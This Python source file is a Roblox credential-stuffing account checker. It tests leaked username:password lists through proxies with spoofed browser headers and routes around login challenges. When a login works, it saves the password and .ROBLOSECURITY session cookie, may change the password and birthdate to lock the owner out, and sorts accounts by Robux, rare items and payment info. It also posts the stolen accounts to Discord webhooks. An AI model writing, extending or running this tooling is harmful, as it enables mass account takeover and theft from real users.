import sys, os, string, random, re
from time import sleep, time
from json import loads, dumps
from base64 import b64decode, b64encode
from custom_solver import get_token
from thread_lock import ThreadLock
from counter import Counter
from combocheck import ComboCheck
from session import Session
from output import Output
from account_info import AccountInfo, has_payment_info
from auth_intent import AuthIntent
from rostile import Rostile
from util import Util
from secure import Secure

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

config = Util.get_config()

WEBHOOK_ENABLED = config["logWebhook"]

DISCORD_ID = config.get("discordId", None)

AUTO_SECURE = config.get("autoSecure", {"password": {"enabled": True, "prefix": ""}, "underage": False})

SKIP_COMBOS = config.get("skipCombos", {})
SKIP_INVALID = SKIP_COMBOS.get("skip_invalid", True)
SKIP_CHECKED = SKIP_COMBOS.get("skip_checked", True)

if WEBHOOK_ENABLED == True:
    from discord_webhook import DiscordWebhook, DiscordEmbed

if type(WEBHOOK_ENABLED) != bool:
    Output("ERROR").log("You must put either true/false for webhook enabled")

WEBHOOKS = config["webhooks"]
WEBHOOK_KEYS = [
    "default", "old_accounts", "locked_accounts", "rap",
    "rare_items", "items", "banned_accounts", "robux"
]

WEBHOOK_VARS = {key: None if (value := WEBHOOKS.get(key, "")) == "" else value for key in WEBHOOK_KEYS}

WEBHOOK = WEBHOOK_VARS["default"]
OLD_WEBHOOK = WEBHOOK_VARS["old_accounts"]
LOCKED_WEBHOOK = WEBHOOK_VARS["locked_accounts"]
RAP_WEBHOOK = WEBHOOK_VARS["rap"]
RARE_WEBHOOK = WEBHOOK_VARS["rare_items"]
ITEM_WEBHOOK = WEBHOOK_VARS["items"]
BANNED_WEBHOOK = WEBHOOK_VARS["banned_accounts"]
ROBUX_WEBHOOK = WEBHOOK_VARS["robux"]

DEBUG = config.get("debug", False)

badge_icons = {
    "Administrator": "<:Administrator:1345542368056578079>",
    "Ambassador": "<:Ambassador:1345542370195800147>",
    "Bloxxer": "<:Bloxxer:1345542748777873472>",
    "Bricksmith": "<:Bricksmith:1345542374545166406>",
    "Combat Initiation": "<:CombatInitiation:1345542750837276704>",
    "Friendship": "<:Friendship:1345542378026700982>",
    "Homestead": "<:Homestead:1345542380367122453>",
    "Inviter": "<:Inviter:1345542382313279538>",
    "Official Model Maker": "<:OfficialModelMaker:1345542384473210930>",
    "Veteran": "<:Veteran:1345542385932701749>",
    "Warrior": "<:Warrior:1345542752359677974>",
    "Outrageous Builders Club": "<:OutrageousBuildersClub:1345683662972256256>",
    "Turbo Builders Club": "<:TurboBuildersClub:1345683653719494686>",
    "Welcome To The Club": "<:WelcomeToTheClub:1345683661592334398>"
}

def replace_badge_names(text):
    pattern = re.compile(r'\b(' + '|'.join(re.escape(badge) for badge in badge_icons) + r')\b')
    text = pattern.sub(lambda match: badge_icons[match.group(0)], text)
    return text.replace(",", "")

class Roblox:
    def __init__(self, lock: ThreadLock, counter: Counter, invalid: ComboCheck, checked_file: ComboCheck, locked: ComboCheck, accounts) -> None:
        self.account = None
        self.attempts = 0
        self.checked = False
        self.lock = lock
        self.counter = counter
        self.accounts = accounts
        self.invalid = invalid
        self.checked_file = checked_file
        self.locked = locked
        self.email = None
        self.bypass_user = None
        self.server_nonce  = None

    def continue_check(self, continue_payload) -> None:
        sleep(1)

        response = self.session.post('https://apis.roblox.com/challenge/v1/continue', data=continue_payload)

        if response.json().get("challengeType") == "captcha":
            return loads(response.json()["challengeMetadata"])

        if response.status_code != 200:
            raise ValueError("Rejected by continue API")

        payload = {
            "ctype": self.ctype,
            "cvalue": self.account[0],
            "password": self.account[1],
            "secureAuthenticationIntent": self.sec_auth_intent
        }

        self.session.headers = {
            **self.session.headers,
            "rblx-challenge-id": continue_payload["challengeId"],
            "rblx-challenge-metadata": b64encode(continue_payload["challengeMetadata"].encode("utf-8")).decode("utf-8"),
            "rblx-challenge-type": continue_payload["challengeType"]
        }

        response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        csrf = response.headers.get("x-csrf-token")

        if csrf != None:
            self.session.headers = {
                **self.session.headers,
                "x-csrf-token": csrf
            }

            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        temp_dict = self.session.headers.copy()

        temp_dict.pop("rblx-challenge-id")
        temp_dict.pop("rblx-challenge-metadata")
        temp_dict.pop("rblx-challenge-type")

        self.session.headers = temp_dict

        if response.status_code == 429:
            raise ValueError("Rate limited")
        
        if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
            return response.json()
        
        if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
            self.account[0] = response.json()["user"]["name"]

            return [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
            
        elif "Challenge failed" in response.text:
            raise ValueError("Rejected by login API")
        
        elif "Account has been locked" in response.text:
            raise ValueError("locked")

        else:
            raise ValueError("invalid")
        
    def handle_rostile(self, challenge_metadata):
        try:
            metadata = loads(b64decode(challenge_metadata))
            print("ROSTILE_PUZZLE_TYPE" in str(metadata), challenge_metadata)
            if "ROSTILE_PUZZLE_TYPE" not in str(metadata):
                return None
            challenge_id = metadata['challengeId']
            verify_response = self.session.post("https://apis.roblox.com/rostile/v1/verify", json=Rostile.get_solution(challenge_id))
            print("verify", verify_response)

            redemption_token = verify_response.json()['redemptionToken']
            continue_response = self.session.post("https://apis.roblox.com/challenge/v1/continue", json={
                "challengeId": challenge_id,
                "challengeType": "rostile",
                "challengeMetadata": dumps({"redemptionToken": redemption_token})
            })

            if continue_response.status_code != 200:
                return False

            self.session.headers = {
                **self.session.headers,
                "rblx-challenge-id": challenge_id,
                "rblx-challenge-type": "rostile",
                "rblx-challenge-metadata": challenge_metadata
            }

            return True
        except:
            return False

    def check(self) -> dict:
        while True:
            try:
                if self.counter.get_value() >= len(self.accounts):
                    return

                if self.account == None or self.checked == True:
                    self.checked = False
                    self.attempts = 0

                    with self.lock.get_lock():
                        self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                        self.counter.increment()
                else:
                    if self.attempts == 10:
                        self.checked = False
                        self.attempts = 0

                        with self.lock.get_lock():
                            self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                            self.counter.increment()

                        Output("ERROR").log(f"Incorrect information | {self.account[0]}")

                        with open("output/invalid.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                
                Output("INFO").log(f"Checking account | {self.account[0]}")
                
                if SKIP_INVALID and self.invalid.contains(f"{self.account[0]}:{self.account[1]}") or self.locked.contains(f"{self.account[0]}:{self.account[1]}"):
                    self.checked = True
                    self.invalid.append(f"{self.account[0]}:{self.account[1]}\n")
                    raise ValueError("invalid")
                
                if SKIP_CHECKED and self.checked_file.contains(f"{self.account[0]}:{self.account[1]}"):
                    print(f"{self.account[0]}:{self.account[1]}", self.checked_file.contains(f"{self.account[0]}:{self.account[1]}"))
                    self.checked = True
                    raise ValueError("checked")

                self.session, self.sec_ch_ua, self.user_agent, self.proxy = Session().session()
                self.accept_language = "en-US,en;q=0.9"

                self.session.headers = {
                    'sec-ch-ua': self.sec_ch_ua,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'upgrade-insecure-requests': '1',
                    'user-agent': self.user_agent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'priority': 'u=0, i'
                }

                self.bypass_user = Util.get_random_bypass_user()

                self.server_nonce = self.session.get("https://apis.roblox.com/hba-service/v1/getServerNonce").text.strip('"')

                initial_login_data = {
                    "ctype": "Username",
                    "cvalue": self.bypass_user,
                    "password": ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(15)),
                    "secureAuthenticationIntent": {
                        "clientPublicKey": "",
                        "clientEpochTimestamp": int(time()),
                        "serverNonce": self.server_nonce,
                        "saiSignature": ""
                    }
                }

                response = self.session.post("https://auth.roblox.com/v2/login", json=initial_login_data)

                if response.status_code == 429:
                    Output("ERROR").log("429 " + self.bypass_user)
                    raise ValueError("429")

                if "x-csrf-token" in response.headers:
                    self.session.headers = {
                        **self.session.headers,
                        "x-csrf-token": response.headers.get("x-csrf-token")
                    }

                    response = self.session.post("https://auth.roblox.com/v2/login", json=initial_login_data)

                    if response.status_code == 429:
                        Output("ERROR").log("429 " + self.bypass_user)
                        raise ValueError("429")

                try:
                    if "rblx-challenge-metadata" in response.headers:
                        rostile_result = self.handle_rostile(response.headers.get('rblx-challenge-metadata'))
                        if rostile_result:
                            Output("SUCCESS").log(rostile_result)
                            login_data = {
                                "ctype": f"{'Email' if '@' in self.account[1] else 'Username'}",
                                "cvalue": self.account[0],
                                "password": self.account[1],
                                "secureAuthenticationIntent": {
                                    "clientPublicKey": "",
                                    "clientEpochTimestamp": int(time.time()),
                                    "serverNonce": self.server_nonce,
                                    "saiSignature": ""
                                }
                            }

                            response = self.session.post("https://auth.roblox.com/v2/login", json=login_data)

                            temp_dict = self.session.headers.copy()

                            temp_dict.pop("rblx-challenge-id")
                            temp_dict.pop("rblx-challenge-metadata")
                            temp_dict.pop("rblx-challenge-type")

                            self.session.headers = temp_dict
                            
                            if "Incorrect" in response.text:
                                raise ValueError("invalid")
                            
                            if "Account has been locked" in response.text:
                                raise ValueError("locked")
                            
                            if 'Received credentials belong to multiple accounts' in response.text:
                                self.handle_multi(user_id_and_cookie)

                                self.checked = True
                                continue

                            if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                                user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]

                                self.account[0] = response.json()["user"]["name"]

                                Output("SUCCESS").log(f"{self.account[0]} is vaild")

                                cookie_header += f"; .ROBLOSECURITY={response.cookies.get('.ROBLOSECURITY')}"

                                self.handle_valid(user_id_and_cookie, cookie_header)
                                
                                self.checked = True
                                continue

                except Exception as e:
                    print(e)

            except Exception as e:
                if str(e) == "invalid":
                    self.checked = True

                    Output("ERROR").log(f"{self.account[0]} is incorrect")

                    with self.lock.get_lock():
                        with open("output/invalid.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                elif str(e) == "locked":
                    self.checked = True

                    Output("WARNING").log(f"{self.account[0]} is locked")

                    og_combo = f'{self.account[0]}:{self.account[1]}'

                    with self.lock.get_lock():
                        with open("output/locked.txt", "a", encoding="utf-8") as file:
                            file.write(f'{og_combo}\n')

                    if self.account[1].isupper():
                        new_password = self.account[1].lower()
                    else:
                        match = re.search(r'[A-Za-z]', self.account[1])
                        if match:
                            index = match.start()
                            new_password = (
                                self.account[1][:index] + self.account[1][index].swapcase() + self.account[1][index+1:]
                            )
                        else:
                            new_password = self.account[1]

                    combo = f'{self.account[0]}:{new_password}'
                    if not self.locked.contains(combo):
                        self.accounts.insert(self.counter.get_value() + 1, combo + '\n')

                    self.locked.append(combo)

                    if WEBHOOK_ENABLED:
                        try:
                            webhook = DiscordWebhook(url=LOCKED_WEBHOOK if LOCKED_WEBHOOK else WEBHOOK)

                            embed = DiscordEmbed(title=f'**New Locked**', color='00FF00')
                            embed.set_description(f"**{og_combo}**")

                            embed.set_timestamp()

                            webhook.add_embed(embed)
                            webhook.execute()
                        except Exception as e: 
                            pass
                elif str(e) == "checked":
                    Output("WARNING").log(f"{self.account[0]} already checked")
                else:
                    Output("ERROR").log(str(e))

                    self.attempts += 1

                    continue

    def handle_valid(self, user_id_and_cookie, cookie_header) -> None:
        self.session.headers = {
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'user-agent': self.user_agent,
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.roblox.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.roblox.com/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': self.accept_language,
            'priority': 'u=1, i',
            "cookie": cookie_header
        }

        temp_session, _, _, _ = Session().session()

        DEBUG and Output("INFO").log("Getting_Ban_Status")

        user_info_nocookie = temp_session.get(f"https://users.roblox.com/v1/users/{user_id_and_cookie[0]}").json()
        user_info = self.session.get(f"https://users.roblox.com/v1/users/{user_id_and_cookie[0]}").json()

        is_termed = user_info_nocookie.get("isBanned")
        is_banned = False
        unbanned = False
        if user_info.get("errors"):
            is_banned = user_info["errors"][0]["message"] == "User is moderated"

        DEBUG and Output("INFO").log("Getting_CSRF")

        csrf = self.session.post("https://auth.roblox.com/v2/logout").headers["x-csrf-token"]

        self.session.headers = {
            **self.session.headers,
            "x-csrf-token": csrf
        }

        if is_banned:
            response = self.session.post("https://usermoderation.roblox.com/v1/not-approved/reactivate")
            DEBUG and Output("INFO").log("Unbanned Account")
            DEBUG and Output("INFO").log(response.text, response.status_code)
            if response.status_code == 200:
                is_banned = False
                unbanned = True

        old_password = self.account[1]

        if not (is_termed or is_banned):
            try:
                DEBUG and Output("INFO").log("Securing_Account")
                if not has_payment_info(self.session) and AUTO_SECURE.get("underage"):
                    Secure.change_birthdate(self.session, self.account)

                if AUTO_SECURE.get("password", {}).get("enabled"):
                    new_password = AUTO_SECURE.get("password", {}).get("prefix", "") + ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(25))
                    change_password = Secure.change_password(self.session, new_password, self.account[1], self.sec_auth_intent)

                    if change_password:
                        self.account[1] = new_password
            except Exception as e:
                DEBUG and Output("ERROR").log(e)
                pass

        with self.lock.get_lock():
            with open("output/valid.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        with self.lock.get_lock():
            with open("output/cookies.txt", "a", encoding="utf-8") as file:
                file.write(f'{user_id_and_cookie[1]}\n')
                
        with self.lock.get_lock():
            with open("output/og_combo.txt", "a", encoding="utf-8") as file:
                file.write(f"{self.account[0]}:{old_password}:{self.email}\n")
                self.checked_file.append(f"{self.account[0]}:{old_password}:{self.email}\n")

        if not (is_termed or is_banned):
            DEBUG and Output("INFO").log("Getting_Account_Info")
            acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie[0])


        if WEBHOOK_ENABLED:
            DEBUG and Output("INFO").log("Sending_Webhook")
            try:
                webhook = DiscordWebhook(
                    url=BANNED_WEBHOOK if BANNED_WEBHOOK and is_termed else RAP_WEBHOOK if RAP_WEBHOOK and not (is_termed or is_banned) and acc_info.get("RAP", "0").replace(",", "").replace("_unknown", "0").isdigit() and int(acc_info.get("RAP", "0").replace(",", "").replace("_unknown", "0")) > 0 else ROBUX_WEBHOOK if ROBUX_WEBHOOK and not (is_termed or is_banned) and acc_info.get("Robux", "0").replace(",", "").replace("_unknown", "0").isdigit() and int(acc_info.get("Robux", "0").replace(",", "").replace("_unknown", "0")) > 0 else RARE_WEBHOOK if RARE_WEBHOOK and not (is_termed or is_banned) and acc_info.get("Rare Items", "") != "None" and acc_info.get("Rare Items", "") != "_unknown" else OLD_WEBHOOK if OLD_WEBHOOK and not (is_termed or is_banned) and acc_info.get('Creation Date', '9999') != "_unknown" and acc_info.get('Creation Date', '9999').isdigit() and int(acc_info['Creation Date']) <= 2008 else ITEM_WEBHOOK if ITEM_WEBHOOK and not (is_termed or is_banned) and acc_info.get("Total Items", "0") != "_unknown" and str(acc_info.get("Total Items", "0")).isdigit() and int(acc_info.get("Total Items", 0)) >= 5 else WEBHOOK,
                    content=f"<@{DISCORD_ID}>" if DISCORD_ID and str(DISCORD_ID) != "" else "@here"
                )

                embed = DiscordEmbed(title=f'**@{self.account[0]}** ({user_id_and_cookie[0]})', color='00FF00')

                if not (is_termed or is_banned):
                    embed.set_footer(f"NoSolve")

                    for key, value in acc_info.items():
                        if key == "Thumbnail":
                            embed.set_thumbnail(str(value) if value != "_unknown" else "https://static.wikia.nocookie.net/roblox/images/6/66/Content_Deleted.png/")
                        else:
                            if str(value) != "_unknown":
                                embed.add_embed_field(name=key, value=str(value) if key != "Badges" else replace_badge_names(str(value)), inline=True)
                else:
                    embed.add_embed_field(name="Ban Status", value="Termed" if is_termed else "Temp-Banned")

                if unbanned:
                    embed.add_embed_field(name="Ban Status", value="Reactivated account")

                embed.set_timestamp()

                webhook.add_embed(embed)
                webhook.execute()
            except Exception as e:
                print(e)
                pass
        
        DEBUG and Output("INFO").log("Writing_Output_Files")
        if not (is_termed or is_banned):
            with self.lock.get_lock():
                with open(f"output/robux/robux{acc_info['Robux']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/rap/rap{acc_info['RAP']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
            
            with self.lock.get_lock():
                with open(f"output/creation_date/year{acc_info['Creation Date']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/balance/balance{acc_info['Balance']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/rare_items/items_{acc_info['Rare Items']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/pending/pending{acc_info['Pending']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/summary/summary{acc_info['Summary']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/items/items_{acc_info['Total Items']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}')

            with self.lock.get_lock():
                with open(f"output/badges/badges_{acc_info['Badges']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}')

            if acc_info["Payment Info"] == True:
                with self.lock.get_lock():
                    with open(f"output/payment_info/payment_info.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
            
            elif acc_info["Payment Info"] == "_unknown":
                with self.lock.get_lock():
                    with open(f"output/payment_info/payment_info_unknown.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
            
            if acc_info["Premium"] == True:
                with self.lock.get_lock():
                    with open(f"output/premium/premium.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            elif acc_info["Premium"] == "_unknown":
                with self.lock.get_lock():
                    with open(f"output/premium/premium_unknown.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        else:
            if is_termed:
                with self.lock.get_lock():
                    with open("output/terminated.txt", "a", encoding="utf-8") as file:
                        file.write(f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}")
            else:
                with self.lock.get_lock():
                    with open("output/temp_banned.txt", "a", encoding="utf-8") as file:
                        file.write(f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}")
        
        DEBUG and Output("INFO").log("Done")

    def handle_multi(self, user_id_and_cookie) -> None:
        multiple_accounts = loads(user_id_and_cookie["errors"][0]["fieldData"])["users"]

        for multiple_account in multiple_accounts:
            self.accounts.insert(self.counter.get_value() + 1, f"{multiple_account.get("name")}:{self.account[1]}:{self.account[0]}\n")

        if self.account[1].isupper():
            new_password = self.account[1].lower()
        else:
            match = re.search(r'[A-Za-z]', self.account[1])
            if match:
                index = match.start()
                new_password = (
                    self.account[1][:index] + self.account[1][index].swapcase() + self.account[1][index+1:]
                )
            else:
                new_password = self.account[1]

        combo = f'{self.account[0]}:{new_password}'
        self.accounts.insert(self.counter.get_value() + 1, combo + '\n')